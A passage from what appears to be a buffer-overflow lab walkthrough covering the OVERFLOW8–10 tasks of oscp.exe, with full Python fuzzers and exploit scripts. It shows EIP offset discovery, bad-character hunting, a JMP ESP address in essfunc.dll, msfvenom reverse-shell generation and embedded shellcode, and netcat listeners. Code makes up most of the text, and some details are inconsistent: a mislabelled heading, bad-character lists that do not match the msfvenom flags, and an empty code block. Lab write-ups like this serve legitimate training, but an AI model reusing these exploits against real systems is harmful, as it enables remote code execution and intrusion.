Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9"
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

On kail run the exploit again then in mona run the following to get the offset for EIP. We were able to find the offset was 1786.

**Kali**

```
python exploit.py $VICTIM 1337
```

**Immunity Debugger**

```
!mona findmsp -distance 1800
```

<figure><img src="../../.gitbook/assets/image (10) (1) (5).png" alt=""><figcaption></figcaption></figure>

**exploit.py - Code Changes #2**

```
// Some code
```

**Kali**

After running the program again we now can fill EIP with our Bs so we now have control of EIP.

```
python exploit.py $VICTIM 1337
```

<figure><img src="../../.gitbook/assets/image (11) (8).png" alt=""><figcaption></figcaption></figure>

### Finding Bad Characters

**Kali**

Now we changed the program to look for bad characters so we don't later use those bad characters when generating our payload. We do this by setting our payload to all possible characters, than follow EIP to see which characters aren't showing up. To do this we just have to keep running our exploit and removing the bad characters one by one. The bad characters found were: \x00

```
python exploit.py $VICTIM 1337
```

#### **exploit.py - Code Changes #3**

```
import socket, time, sys

#Bad chars found: \x00\x1d\x2e\xc7\xee
badChars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2f"
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xef"
"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW8 "
	offset = 1786
	overflow = "A" * offset
	retn = "BBBB"
	padding = ""
	payload = badChars
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

<figure><img src="../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (20) (3).png" alt=""><figcaption></figcaption></figure>

### Finding a Jump Point

Now we need to find a place to jump to to run our payload.  We find there is only one place that will meets our conditions that we need which is an address with  SafeSEH, ASLR, and NXCompat disabled and the  memory address doesn't start with 0x00. ex: 0x0040000 won't work, 0x100000 will work. essfunc.dll meets this criteria.&#x20;

**Immunity Debugger**

```
!mona modules
```

<figure><img src="../../.gitbook/assets/image (21) (2) (1).png" alt=""><figcaption></figcaption></figure>

We find that essfunc.dll has 9 possible JMP ESPs to use. So we will start with the first one which is 0x625011af but when we add it to our code we need it in little endian format so it becomes \xaf\x11\x50\x62.

**Immunity Debugger**

```
!mona find -s "\xff\xe4" -m essfunc.dll
```

<figure><img src="../../.gitbook/assets/image (7) (4) (1).png" alt=""><figcaption></figcaption></figure>

### Exploit

Now that we have the return address to use, we just need to generate our payload without using the bad characters found previously. I also added 16 NOPs before the payload as suggested in the room. All that is left is to is to update our code with our payload and run it against the program.

```
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
```

#### **exploit.py - Code Changes #4**

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW8 "
	offset = 1786
	overflow = "A" * offset
	retn = "\xaf\x11\x50\x62"
	padding = "\x90" * 16
	payload = ("\xba\x09\x91\x55\xfa\xd9\xe8\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x52\x83\xc6\x04\x31\x56\x0e\x03\x5f\x9f\xb7\x0f\xa3\x77\xb5"
"\xf0\x5b\x88\xda\x79\xbe\xb9\xda\x1e\xcb\xea\xea\x55\x99\x06"
"\x80\x38\x09\x9c\xe4\x94\x3e\x15\x42\xc3\x71\xa6\xff\x37\x10"
"\x24\x02\x64\xf2\x15\xcd\x79\xf3\x52\x30\x73\xa1\x0b\x3e\x26"
"\x55\x3f\x0a\xfb\xde\x73\x9a\x7b\x03\xc3\x9d\xaa\x92\x5f\xc4"
"\x6c\x15\xb3\x7c\x25\x0d\xd0\xb9\xff\xa6\x22\x35\xfe\x6e\x7b"
"\xb6\xad\x4f\xb3\x45\xaf\x88\x74\xb6\xda\xe0\x86\x4b\xdd\x37"
"\xf4\x97\x68\xa3\x5e\x53\xca\x0f\x5e\xb0\x8d\xc4\x6c\x7d\xd9"
"\x82\x70\x80\x0e\xb9\x8d\x09\xb1\x6d\x04\x49\x96\xa9\x4c\x09"
"\xb7\xe8\x28\xfc\xc8\xea\x92\xa1\x6c\x61\x3e\xb5\x1c\x28\x57"
"\x7a\x2d\xd2\xa7\x14\x26\xa1\x95\xbb\x9c\x2d\x96\x34\x3b\xaa"
"\xd9\x6e\xfb\x24\x24\x91\xfc\x6d\xe3\xc5\xac\x05\xc2\x65\x27"
"\xd5\xeb\xb3\xe8\x85\x43\x6c\x49\x75\x24\xdc\x21\x9f\xab\x03"
"\x51\xa0\x61\x2c\xf8\x5b\xe2\x59\xf7\x83\x2b\x35\x05\x43\xdd"
"\x9a\x80\xa5\xb7\x32\xc5\x7e\x20\xaa\x4c\xf4\xd1\x33\x5b\x71"
"\xd1\xb8\x68\x86\x9c\x48\x04\x94\x49\xb9\x53\xc6\xdc\xc6\x49"
"\x6e\x82\x55\x16\x6e\xcd\x45\x81\x39\x9a\xb8\xd8\xaf\x36\xe2"
"\x72\xcd\xca\x72\xbc\x55\x11\x47\x43\x54\xd4\xf3\x67\x46\x20"
"\xfb\x23\x32\xfc\xaa\xfd\xec\xba\x04\x4c\x46\x15\xfa\x06\x0e"
"\xe0\x30\x99\x48\xed\x1c\x6f\xb4\x5c\xc9\x36\xcb\x51\x9d\xbe"
"\xb4\x8f\x3d\x40\x6f\x14\x5d\xa3\xa5\x61\xf6\x7a\x2c\xc8\x9b"
"\x7c\x9b\x0f\xa2\xfe\x29\xf0\x51\x1e\x58\xf5\x1e\x98\xb1\x87"
"\x0f\x4d\xb5\x34\x2f\x44"
		)
	
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali #1**

```
nc -lvnp 4444
```

**Kali #2**

```
python exploit.py $VICTIM 1337
```

<figure><img src="../../.gitbook/assets/image (18) (1) (2).png" alt=""><figcaption></figcaption></figure>

## oscp.exe - OVERFLOW1

#### fuzzer.py

Slightly modified version of the script given.

```
#!/usr/bin/env python3

import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))
	timeout = 5
	prefix = "OVERFLOW9 "
	string = prefix + "A" * 100

	while True:
		try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
				s.settimeout(timeout)
				s.connect((ip, port))
				s.recv(1024)
				print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
				s.send(bytes(string, "latin-1"))
				s.recv(1024)
		except:
			print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
			sys.exit(0)
		string += 100 * "A"
		time.sleep(1)

except:
    print ("\nCould not connect!")
    sys.exit()

```



#### exploit.py

Slightly modified version of the script given.

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW9 "
	offset = 0
	overflow = "A" * offset
	retn = ""
	padding = ""
	payload = ""
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali**

Login the the Windows box then open the oscp.exe within Immunity Debugger. Press the play button to start the program.

```
xfreerdp /u:admin /p:password /cert:ignore /v:$VICTIM /workarea
```

### **Crash Replication & Controlling EIP**

```
python fuzzer.py $VICTIM 1337
```

Program crashed at 1600 bytes with fuzzer.py

<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

```
/opt/metasploit-framework-5101/tools/exploit/pattern_create.rb -l 1600 
```

**exploit.py - Code Changes #1**

I added the pattern\_create output into the payload variable.

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW9 "
	offset = 0
	overflow = "A" * offset
	retn = ""
	padding = ""
	payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2C"
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

On kail run the exploit again then in mona run the following to get the offset for EIP. We were able to find the offset was 1514.

**Kali**

```
python exploit.py $VICTIM 1337
```

**Immunity Debugger**

```
!mona findmsp -distance 1600
```

<figure><img src="../../.gitbook/assets/image (4) (5) (1).png" alt=""><figcaption></figcaption></figure>

**exploit.py - Code Changes #2**

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW9 "
	offset = 0
	overflow = "A" * offset
	retn = ""
	padding = ""
	payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2C"
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali**

After running the program again we now can fill EIP with our Bs so we now have control of EIP.

```
python exploit.py $VICTIM 1337
```

<figure><img src="../../.gitbook/assets/image (8) (4) (1).png" alt=""><figcaption></figcaption></figure>

### Finding Bad Characters

**Kali**

Now we changed the program to look for bad characters so we don't later use those bad characters when generating our payload. We do this by setting our payload to all possible characters, than follow EIP to see which characters aren't showing up. To do this we just have to keep running our exploit and removing the bad characters one by one. The bad characters found were: \x00\x04\x3e\x3f\xe1

```
python exploit.py $VICTIM 1337
```

#### **exploit.py - Code Changes #3**

```
import socket, time, sys

#Bad Chars found: \x00\x04\x3e\x3f\xe1
badChars = (
"\x01\x02\x03\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW9 "
	offset = 1514
	overflow = "A" * offset
	retn = "BBBB"
	padding = ""
	payload = badChars
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

<figure><img src="../../.gitbook/assets/image (25) (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (9) (5) (1).png" alt=""><figcaption></figcaption></figure>

### Finding a Jump Point

Now we need to find a place to jump to to run our payload.  We find there is only one place that will meets our conditions that we need which is an address with  SafeSEH, ASLR, and NXCompat disabled and the  memory address doesn't start with 0x00. ex: 0x0040000 won't work, 0x100000 will work. essfunc.dll meets this criteria.&#x20;

**Immunity Debugger**

```
!mona modules
```

<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

We find that essfunc.dll has 9 possible JMP ESPs to use. So we will start with the first one which is 0x625011af but when we add it to our code we need it in little endian format so it becomes \xaf\x11\x50\x62.

**Immunity Debugger**

```
!mona find -s "\xff\xe4" -m essfunc.dll
```

<figure><img src="../../.gitbook/assets/image (19) (4).png" alt=""><figcaption></figcaption></figure>

### Exploit

Now that we have the return address to use, we just need to generate our payload without using the bad characters found previously. I also added 16 NOPs before the payload as suggested in the room. All that is left is to is to update our code with our payload and run it against the program.

```
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
```

#### **exploit.py - Code Changes #4**

```
import socket, time, sys


try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW9 "
	offset = 1514
	overflow = "A" * offset
	retn = "\xaf\x11\x50\x62"
	padding = "\x90" * 16
	payload = ("\xbf\x95\xe5\x27\xc3\xd9\xf6\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x52\x83\xeb\xfc\x31\x7b\x0e\x03\xee\xeb\xc5\x36\xec\x1c\x8b"
"\xb9\x0c\xdd\xec\x30\xe9\xec\x2c\x26\x7a\x5e\x9d\x2c\x2e\x53"
"\x56\x60\xda\xe0\x1a\xad\xed\x41\x90\x8b\xc0\x52\x89\xe8\x43"
"\xd1\xd0\x3c\xa3\xe8\x1a\x31\xa2\x2d\x46\xb8\xf6\xe6\x0c\x6f"
"\xe6\x83\x59\xac\x8d\xd8\x4c\xb4\x72\xa8\x6f\x95\x25\xa2\x29"
"\x35\xc4\x67\x42\x7c\xde\x64\x6f\x36\x55\x5e\x1b\xc9\xbf\xae"
"\xe4\x66\xfe\x1e\x17\x76\xc7\x99\xc8\x0d\x31\xda\x75\x16\x86"
"\xa0\xa1\x93\x1c\x02\x21\x03\xf8\xb2\xe6\xd2\x8b\xb9\x43\x90"
"\xd3\xdd\x52\x75\x68\xd9\xdf\x78\xbe\x6b\x9b\x5e\x1a\x37\x7f"
"\xfe\x3b\x9d\x2e\xff\x5b\x7e\x8e\xa5\x10\x93\xdb\xd7\x7b\xfc"
"\x28\xda\x83\xfc\x26\x6d\xf0\xce\xe9\xc5\x9e\x62\x61\xc0\x59"
"\x84\x58\xb4\xf5\x7b\x63\xc5\xdc\xbf\x37\x95\x76\x69\x38\x7e"
"\x86\x96\xed\xd1\xd6\x38\x5e\x92\x86\xf8\x0e\x7a\xcc\xf6\x71"
"\x9a\xef\xdc\x19\x31\x0a\xb7\x2f\xcc\xf4\x9e\x58\xd2\xf4\x31"
"\xc5\x5b\x12\x5b\xe5\x0d\x8d\xf4\x9c\x17\x45\x64\x60\x82\x20"
"\xa6\xea\x21\xd5\x69\x1b\x4f\xc5\x1e\xeb\x1a\xb7\x89\xf4\xb0"
"\xdf\x56\x66\x5f\x1f\x10\x9b\xc8\x48\x75\x6d\x01\x1c\x6b\xd4"
"\xbb\x02\x76\x80\x84\x86\xad\x71\x0a\x07\x23\xcd\x28\x17\xfd"
"\xce\x74\x43\x51\x99\x22\x3d\x17\x73\x85\x97\xc1\x28\x4f\x7f"
"\x97\x02\x50\xf9\x98\x4e\x26\xe5\x29\x27\x7f\x1a\x85\xaf\x77"
"\x63\xfb\x4f\x77\xbe\xbf\x70\x9a\x6a\xca\x18\x03\xff\x77\x45"
"\xb4\x2a\xbb\x70\x37\xde\x44\x87\x27\xab\x41\xc3\xef\x40\x38"
"\x5c\x9a\x66\xef\x5d\x8f"
		)
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali #1**

```
nc -lvnp 4444
```

**Kali #2**

```
python exploit.py $VICTIM 1337
```

<figure><img src="../../.gitbook/assets/image (30) (1).png" alt=""><figcaption></figcaption></figure>

## oscp.exe - OVERFLOW10

#### fuzzer.py

Slightly modified version of the script given.

```
#!/usr/bin/env python3

import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))
	timeout = 5
	prefix = "OVERFLOW10 "
	string = prefix + "A" * 100

	while True:
		try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
				s.settimeout(timeout)
				s.connect((ip, port))
				s.recv(1024)
				print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
				s.send(bytes(string, "latin-1"))
				s.recv(1024)
		except:
			print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
			sys.exit(0)
		string += 100 * "A"
		time.sleep(1)

except:
    print ("\nCould not connect!")
    sys.exit()

```



#### exploit.py

Slightly modified version of the script given.

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW10 "
	offset = 0
	overflow = "A" * offset
	retn = ""
	padding = ""
	payload = ""
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali**

Login the the Windows box then open the oscp.exe within Immunity Debugger. Press the play button to start the program.

```
xfreerdp /u:admin /p:password /cert:ignore /v:$VICTIM /workarea
```

### **Crash Replication & Controlling EIP**

```
python fuzzer.py $VICTIM 1337
```

Program crashed at 600 bytes with fuzzer.py

<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

```
/opt/metasploit-framework-5101/tools/exploit/pattern_create.rb -l 600
```

**exploit.py - Code Changes #1**

I added the pattern\_create output into the payload variable.

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
